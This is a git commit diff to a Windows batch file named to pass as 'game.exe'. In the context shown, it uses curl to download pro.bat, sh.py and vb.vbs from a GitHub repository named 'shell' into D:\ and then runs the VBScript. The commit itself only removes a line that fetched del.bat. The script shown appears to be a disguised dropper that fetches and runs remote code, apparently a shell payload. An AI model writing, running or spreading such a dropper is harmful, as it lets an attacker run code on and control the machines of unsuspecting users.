da7148e6536c596ab1907c4727b8f72c2341e8f5
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-01 22:30:39 +0300

    Update 'game.exe'.bat

--- 'game.exe'.bat
+++ 'game.exe'.bat
@@ -2,6 +2,5 @@
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat 
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py 
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs 
-curl https://raw.githubusercontent.com/0x2034/shell/main/del.bat -o D:\del.bat
 call D:\vb.vbs
 exit
